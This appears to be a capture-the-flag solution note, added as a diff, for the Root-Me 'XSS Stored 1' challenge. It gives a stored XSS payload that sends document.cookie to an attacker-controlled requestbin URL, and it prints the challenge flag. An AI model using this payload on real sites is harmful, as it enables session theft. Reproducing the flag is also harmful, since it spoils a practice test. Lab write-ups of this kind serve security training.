@@ -1,0 +1,10 @@
+Video Solution: https://youtu.be/x55DTw9KEu8
+Task on RootMe: https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1
+
+http://challenge01.root-me.org/web-client/ch18/
+
+Open https://requestb.in/ to capture requests, create requestbin
+
+<script>document.write("<img src='your_request_bin_url'"+document.cookie+"');</script> some text
+
+#Flag = Nkl9qe4cdLIO2P7MIsWS8ofD6
